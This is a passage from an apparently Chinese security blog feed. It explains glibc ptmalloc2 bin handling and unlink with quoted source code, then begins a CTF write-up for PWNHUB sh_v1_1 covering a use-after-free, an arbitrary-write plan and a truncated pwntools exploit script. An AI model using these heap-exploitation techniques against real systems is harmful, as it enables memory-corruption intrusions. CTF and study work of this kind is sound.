判断下一个堆已经被释放合并到当前要释放的堆并通过<code>unlink</code>将该chunk从空闲链表中脱离的时候不会清空堆里的内容，所以两个堆合并的时候保留了<code>fd</code>和<code>bk</code>，在申请的时候只要不覆盖掉堆里的内容就能够把<code>main_arena</code>地址申请出来，两个堆必须地址连续</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (!nextinuse) &#123;unlink(av, nextchunk, bck, fwd);size +&#x3D; nextsize;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul></li></ul><h3 id="任意地址写为一个很大的数值"><a href="#任意地址写为一个很大的数值" class="headerlink" title="任意地址写为一个很大的数值"></a>任意地址写为一个很大的数值</h3><p>原理：将 <code>bck-&gt;fd</code> 的位置写入本 <code>unsorted Bin</code> 的位置，控制了<code>bk</code>即可将<code>unsorted_chunks (av)</code>写到任意地址（写入的地址要减两倍机器字长），将该堆申请出来就可以实现任意地址改为一个不可控的很大的数值</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;* remove from unsorted list *&#x2F;          unsorted_chunks (av)-&gt;bk &#x3D; bck;          bck-&gt;fd &#x3D; unsorted_chunks (av);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h1><h2 id="free到small-bin"><a href="#free到small-bin" class="headerlink" title="free到small bin"></a>free到small bin</h2><h3 id="源代码-1"><a href="#源代码-1" class="headerlink" title="源代码"></a>源代码</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdlib.h&gt;int main(int argc, char **argv)&#123;void *p;p &#x3D; malloc(0x100);    malloc(0x100);free(p);    malloc(0x110);return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="运行过程-5"><a href="#运行过程-5" class="headerlink" title="运行过程"></a>运行过程</h3><ul><li><p>运行到[从unsorted bin取出chunk](#从unsorted bin取出chunk)的将 <code>bck-&gt;fd</code> 的位置写入本 Unsorted Bin 的位置</p></li><li><p>判断<code>unsorted bin</code>中循环到的堆是否和申请的堆大小精确匹配，不匹配则跳过</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (size &#x3D;&#x3D; nb)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>判断是否属于<code>small bin</code>，属于则获取所在的<code>small bin</code>链下标和头结点和首结点，并且将循环到的堆连接到<code>small bin</code>的头部</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (in_smallbin_range (size))            &#123;              victim_index &#x3D; smallbin_index (size);              bck &#x3D; bin_at (av, victim_index);              fwd &#x3D; bck-&gt;fd;            &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">victim-&gt;bk &#x3D; bck;         victim-&gt;fd &#x3D; fwd;         fwd-&gt;bk &#x3D; victim;         bck-&gt;fd &#x3D; victim;if (in_smallbin_range (size))           &#123;             victim_index &#x3D; smallbin_index (size);             bck &#x3D; bin_at (av, victim_index);             fwd &#x3D; bck-&gt;fd;           &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="从small-bin取出chunk"><a href="#从small-bin取出chunk" class="headerlink" title="从small bin取出chunk"></a>从small bin取出chunk</h2><h3 id="源代码-2"><a href="#源代码-2" class="headerlink" title="源代码"></a>源代码</h3><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdlib.h&gt;int main(int argc, char **argv)&#123;void *p;p &#x3D; malloc(0x100);    malloc(0x100);free(p);    malloc(0x110);    malloc(0x100);return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="运行过程-6"><a href="#运行过程-6" class="headerlink" title="运行过程"></a>运行过程</h3><ul><li><p>运行到<a href="#%E5%88%9D%E6%AC%A1%E5%88%9B%E5%BB%BA%E5%A0%86">初次创建堆</a>的判断是否属于<code>smallbin</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (in_smallbin_range (nb))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>获取申请的堆的大小所在的下标和地址</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">idx &#x3D; smallbin_index (nb);bin &#x3D; bin_at (av, idx);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>判断所在的下标的链是否为空，为空则说明获取失败跳过该部分</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if ((victim &#x3D; last (bin)) !&#x3D; bin)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>不为空则判断获取到的链表尾部的堆是否为空，为空则说明<code>small bin</code>未初始化，调用<code>malloc_consolidate</code>进行初始化</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if ((victim &#x3D; last (bin)) !&#x3D; bin)        &#123;          if (victim &#x3D;&#x3D; 0) &#x2F;* initialization check *&#x2F;            malloc_consolidate (av);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>不为空则先获取最后一个结点的下一个结点，判断下一个结点的<code>fd</code>是否为最后一个结点，不是则报错</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">else           &#123;             bck &#x3D; victim-&gt;bk;if (__glibc_unlikely (bck-&gt;fd !&#x3D; victim))               &#123;                 errstr &#x3D; &quot;malloc(): smallbin double linked list corrupted&quot;;                 goto errout;               &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>通过安全检查之后将最后一个结点设置<code>inuse</code>和<code>NON_MAIN_ARENA</code>位并且从链表中取出，返回该堆的地址指针</p></li></ul><pre class="line-numbers language-C" data-language="C"><code class="language-C">set_inuse_bit_at_offset (victim, nb);bin-&gt;bk &#x3D; bck;bck-&gt;fd &#x3D; bin;if (av !&#x3D; &amp;main_arena)  victim-&gt;size |&#x3D; NON_MAIN_ARENA;check_malloced_chunk (av, victim, nb);void *p &#x3D; chunk2mem (victim);alloc_perturb (p, bytes);return p;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h1><h2 id="free到large-bin"><a href="#free到large-bin" class="headerlink" title="free到large bin"></a>free到large bin</h2><h3 id="源代码-3"><a href="#源代码-3" class="headerlink" title="源代码"></a>源代码</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdlib.h&gt;int main(int argc, char **argv)&#123;void *p;p &#x3D; malloc(0x500);    malloc(0x500);free(p);    malloc(0x550);return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="运行过程-7"><a href="#运行过程-7" class="headerlink" title="运行过程"></a>运行过程</h3><ul><li><p>运行到[从unsorted bin取出chunk](#从unsorted bin取出chunk)的将 <code>bck-&gt;fd</code> 的位置写入本 Unsorted Bin 的位置</p></li><li><p>判断是否在<code>small bin</code> ，如果不在则在<code>large bin</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (in_smallbin_range (size))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>获取循环到的堆在<code>large bin</code>中的下标并且取得该链表的首结点<code>bck</code>和头结点<code>fwd</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">victim_index &#x3D; largebin_index (size);bck &#x3D; bin_at (av, victim_index);fwd &#x3D; bck-&gt;fd;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>判断头结点和首结点是否相同，相同则说明该链表为空，直接跳过一些判断和连接，将该堆插入在<code>fd</code> <code>bk</code> 双向链表的头部，并且设置其<code>fd_nextsize</code>和<code>bk_nextsize</code>都为其本身</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (fwd !&#x3D; bck)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">else                victim-&gt;fd_nextsize &#x3D; victim-&gt;bk_nextsize &#x3D; victim;         <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">mark_bin (av, victim_index);victim-&gt;bk &#x3D; bck;victim-&gt;fd &#x3D; fwd;fwd-&gt;bk &#x3D; victim;bck-&gt;fd &#x3D; victim;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>若不相同，即<code>if</code>成立则说明该链中还有其他堆，首先获取到循环到的堆的大小去掉<code>inuse</code>位之后的大小</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;* Or with inuse bit to speed comparisons *&#x2F;                  size |&#x3D; PREV_INUSE;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>如果最后一个堆在<code>main_arena</code>则报错</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) &#x3D;&#x3D; 0);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>如果循环到的堆的大小小于最小的堆那么插入在<code>fd_nextsize</code> <code>nk_nextsize</code>链中最小的堆的后面</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if ((unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size))                    &#123;                      fwd &#x3D; bck;                      bck &#x3D; bck-&gt;bk;                      victim-&gt;fd_nextsize &#x3D; fwd-&gt;fd;                      victim-&gt;bk_nextsize &#x3D; fwd-&gt;fd-&gt;bk_nextsize;                      fwd-&gt;fd-&gt;bk_nextsize &#x3D; victim-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; victim;                    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>如果不是最小的堆那么遍历到第一个不小于该堆的<code>chunk</code>，遍历中判断每一个堆是否属于<code>main_arena</code>，属于则报错</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">else                   &#123;                     assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) &#x3D;&#x3D; 0);                     while ((unsigned long) size &lt; fwd-&gt;size)                       &#123;                         fwd &#x3D; fwd-&gt;fd_nextsize;                         assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) &#x3D;&#x3D; 0);                       &#125;  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>如果遍历到的堆和循环中的堆的大小相同则在<code>fd</code> <code>bk</code>链表中插入到与其相同大小的堆的后面</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if ((unsigned long) size &#x3D;&#x3D; (unsigned long) fwd-&gt;size)                       &#x2F;* Always insert in the second position.  *&#x2F;                       fwd &#x3D; fwd-&gt;fd;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>否则就插入在<code>fd_nextsize</code> <code>nk_nextsize</code>链中遍历到的堆的后面</p><pre class="line-numbers language-none"><code class="language-none">else                        &#123;                          victim-&gt;fd_nextsize &#x3D; fwd;                          victim-&gt;bk_nextsize &#x3D; fwd-&gt;bk_nextsize;                          fwd-&gt;bk_nextsize &#x3D; victim;                          victim-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; victim;                        &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>并且插入到<code>fd</code> <code>bk</code>链表中</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">bck &#x3D; fwd-&gt;bk;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">mark_bin (av, victim_index);victim-&gt;bk &#x3D; bck;victim-&gt;fd &#x3D; fwd;fwd-&gt;bk &#x3D; victim;bck-&gt;fd &#x3D; victim;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="从large-bin取出chunk"><a href="#从large-bin取出chunk" class="headerlink" title="从large bin取出chunk"></a>从large bin取出chunk</h2><h3 id="源代码-4"><a href="#源代码-4" class="headerlink" title="源代码"></a>源代码</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdlib.h&gt;int main(int argc, char **argv)&#123;void *p;p &#x3D; malloc(0x500);    malloc(0x500);free(p);    malloc(0x550);    malloc(0x500);return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="运行过程-8"><a href="#运行过程-8" class="headerlink" title="运行过程"></a>运行过程</h3><ul><li><p>运行到[free到large bin](#free到large bin)结束</p></li><li><p>判断是否不属于<code>small bin</code>，即是否属于<code>large bin</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (!in_smallbin_range (nb))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>获取申请的堆所在的<code>large bin</code>链的地址</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">bin &#x3D; bin_at (av, idx);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>判断是否该链为空或者最大的堆太小不能符合申请的堆的大小，若是则直接结束对<code>large bin</code>中申请堆的判断，若符合则获取了第一个堆到<code>victim</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if ((victim &#x3D; first (bin)) !&#x3D; bin &amp;&amp;              (unsigned long) (victim-&gt;size) &gt;&#x3D; (unsigned long) (nb))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>在<code>fd_nextsize</code> <code>bk_nextsize</code>链中循环遍历到第一个不小于申请的大小的堆</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">victim &#x3D; victim-&gt;bk_nextsize;              while (((unsigned long) (size &#x3D; chunksize (victim)) &lt;                      (unsigned long) (nb)))                victim &#x3D; victim-&gt;bk_nextsize;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>判断遍历到的堆不是尾结点并且它的大小等于它在<code>fd</code> <code>bk</code>链上的上一个堆的大小</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (victim !&#x3D; last (bin) &amp;&amp; victim-&gt;size &#x3D;&#x3D; victim-&gt;fd-&gt;size)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>获取该大小的堆在<code>fd</code> <code>bk</code>链上的第二个堆，因为第一个堆在<code>fd_nextsize</code> <code>bk_nextsize</code>链中，取出需要调整该链，但取出第二个堆就不需要调整链表</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">victim &#x3D; victim-&gt;fd;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>保存该堆大小减去申请的大小的差值并且通过<a href="#unlink">unlink</a>操作从<code>large bin</code>链表中取出该堆</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">remainder_size &#x3D; size - nb;unlink (av, victim, bck, fwd);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>如果差值小于最小的堆的大小，则直接将该堆返回</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (remainder_size &lt; MINSIZE)                &#123;                  set_inuse_bit_at_offset (victim, size);&#x2F;&#x2F;设置inuse位                  if (av !&#x3D; &amp;main_arena)                    victim-&gt;size |&#x3D; NON_MAIN_ARENA;&#x2F;&#x2F;设置NON_MAIN_ARENA位                &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">void *p &#x3D; chunk2mem (victim);         alloc_perturb (p, bytes);         return p;&#x2F;&#x2F;获取并返回该堆的地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>如果差值大于最小的堆的大小则切割<code>large bin</code>，获取上面取到的堆切割了申请的大小的堆之后剩余的堆</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">else                &#123;                  remainder &#x3D; chunk_at_offset (victim, nb);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>获取<code>unsorted bin</code>的首结点和头结点</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">bck &#x3D; unsorted_chunks (av);fwd &#x3D; bck-&gt;fd;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>检查头结点的<code>bk</code>指向的堆是否是首结点，若不是则报错</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (__glibc_unlikely (fwd-&gt;bk !&#x3D; bck))&#x2F;&#x2F;检查头结点后面一个结点是否是首结点                    &#123;                      errstr &#x3D; &quot;malloc(): corrupted unsorted chunks&quot;;                      goto errout;                    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>将剩余的堆插入<code>unsorted bin</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">remainder-&gt;bk &#x3D; bck;            remainder-&gt;fd &#x3D; fwd;            bck-&gt;fd &#x3D; remainder;            fwd-&gt;bk &#x3D; remainder;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>如果剩余的堆不在<code>small bin</code> 的范围内则设置<code>fd_nextsize</code>和<code>bk_nextsize</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (!in_smallbin_range (remainder_size))                    &#123;                      remainder-&gt;fd_nextsize &#x3D; NULL;                      remainder-&gt;bk_nextsize &#x3D; NULL;                    &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>返回切割的符合大小要求的堆的地址</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">check_malloced_chunk (av, victim, nb);              void *p &#x3D; chunk2mem (victim);              alloc_perturb (p, bytes);&#x2F;&#x2F;返回切割出来的申请的大小的堆地址              return p;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h1 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h1><p>用来将一个双向链表（只存储空闲的 chunk）中的一个元素取出来</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;* Take a chunk off a bin list *&#x2F;&#x2F;&#x2F; unlink p#define unlink(AV, P, BK, FD) &#123;                                                &#x2F;&#x2F; 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。    if (__builtin_expect (chunksize(P) !&#x3D; prev_size (next_chunk(P)), 0))            malloc_printerr (&quot;corrupted size vs. prev_size&quot;);                   FD &#x3D; P-&gt;fd;                                                                          BK &#x3D; P-&gt;bk;                                                                          &#x2F;&#x2F; 防止攻击者简单篡改空闲的 chunk 的 fd 与 bk 来实现任意写的效果。    if (__builtin_expect (FD-&gt;bk !&#x3D; P || BK-&gt;fd !&#x3D; P, 0))                            malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);      else &#123;                                                                              FD-&gt;bk &#x3D; BK;                                                                      BK-&gt;fd &#x3D; FD;                                                                      &#x2F;&#x2F; 下面主要考虑 P 对应的 nextsize 双向链表的修改        if (!in_smallbin_range (chunksize_nomask (P))                                          &#x2F;&#x2F; 如果P-&gt;fd_nextsize为 NULL，表明 P 未插入到 nextsize 链表中。            &#x2F;&#x2F; 那么其实也就没有必要对 nextsize 字段进行修改了。            &#x2F;&#x2F; 这里没有去判断 bk_nextsize 字段，可能会出问题。            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize !&#x3D; NULL, 0)) &#123;                                  &#x2F;&#x2F; 类似于小的 chunk 的检查思路            if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize !&#x3D; P, 0)                              || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize !&#x3D; P, 0))                  malloc_printerr (check_action,                                                                     &quot;corrupted double-linked list (not small)&quot;,                                   P, AV);                                                          &#x2F;&#x2F; 这里说明 P 已经在 nextsize 链表中了。            &#x2F;&#x2F; 如果 FD 没有在 nextsize 链表中            if (FD-&gt;fd_nextsize &#x3D;&#x3D; NULL) &#123;                                                      &#x2F;&#x2F; 如果 nextsize 串起来的双链表只有 P 本身，那就直接拿走 P                &#x2F;&#x2F; 令 FD 为 nextsize 串起来的                if (P-&gt;fd_nextsize &#x3D;&#x3D; P)                                                        FD-&gt;fd_nextsize &#x3D; FD-&gt;bk_nextsize &#x3D; FD;                                      else &#123;                                                                              &#x2F;&#x2F; 否则我们需要将 FD 插入到 nextsize 形成的双链表中                    FD-&gt;fd_nextsize &#x3D; P-&gt;fd_nextsize;                                                  FD-&gt;bk_nextsize &#x3D; P-&gt;bk_nextsize;                                                  P-&gt;fd_nextsize-&gt;bk_nextsize &#x3D; FD;                                                  P-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; FD;                                                &#125;                                                                            &#125; else &#123;                                                                              &#x2F;&#x2F; 如果在的话，直接拿走即可                P-&gt;fd_nextsize-&gt;bk_nextsize &#x3D; P-&gt;bk_nextsize;                                      P-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; P-&gt;fd_nextsize;                                    &#125;                                                                                &#125;                                                                            &#125;                                                                              &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> ptmalloc2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWNHUB sh_v1_1</title>
      <link href="/2023/03/13/pwnhub-sh-v1-1/pwnhub-sh-v1-1/"/>
      <url>/2023/03/13/pwnhub-sh-v1-1/pwnhub-sh-v1-1/</url>
      
        <content type="html"><![CDATA[<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><ol><li>rm 释放堆之后未清零造成 UAF 漏洞</li><li>ln 执行时仅判断第一个文件是否存在而不会判断第二个文件是否存在，且连接成功后不存在的文件将被添加到文件列表</li></ol><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ol><li><p>利用两个相同大小的unsorted bin合并，申请一个相同大小的堆块，堆快中残留的fd，可以泄露到 malloc_hook地址进而泄露libc基址</p></li><li><p>删除一个堆之后与另一个堆进行连接</p></li><li><p>再次删除这个堆，即间接的删除了与其进行连接的堆，而不会造成与其连接的堆从文件列表消失</p></li><li><p>再次连接后删除的文件又在文件列表中出现，此时两个文件即两个堆都已经被释放，且最开始被连接的堆的fd为其之后连接的堆</p></li><li><p>用gedit编辑最开始被释放的堆，即可修改其fd，再次申请就可以实现任意地址写</p></li></ol><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./sh_v1.1'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'121.40.89.206'</span><span class="token punctuation">,</span><span class="token number">34883</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">touch</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p1 <span class="token operator">=</span> <span class="token string">'touch '</span> <span class="token operator">+</span> filename    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>>>'</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>>>'</span><span class="token punctuation">,</span> <span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">rm</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>    p1 <span class="token operator">=</span> <span class="token string">'rm '</span> <span class="token operator">+</span> filename    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>>>'</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">cp</span><span class="token punctuation">(</span>filename1<span class="token punctuation">,</span> filename2<span class="token punctuation">)</span><span class="token punctuation">:</span>    p1 <span class="token operator">=</span> <span class="token string">'cp '</span> <span class="token operator">+</span> filename1 <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span>  filename2    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>>>'</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">cat</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>    p1 <span class="token operator">=</span> <span class="token string">'cat '</span> <span class="token operator">+</span> filename    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>>>'</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">gedit</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p1 <span class="token operator">=</span> <span class="token string">'gedit '</span> <span class="token operator">+</span> filename    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>>>'</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ln</span><span class="token punctuation">(</span>filename1<span class="token punctuation">,</span> filename2<span class="token punctuation">)</span><span class="token punctuation">:</span>    p1 <span class="token operator">=</span> <span class="token string">'ln '</span> <span class="token operator">+</span> filename1 <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span>  filename2    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>>>>'</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p1 <span class="token operator">=</span> <span class="token string">'try'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.txt'</span>    touch<span class="token punctuation">(</span>p1<span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p1  <span class="token operator">=</span> <span class="token string">'try'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token 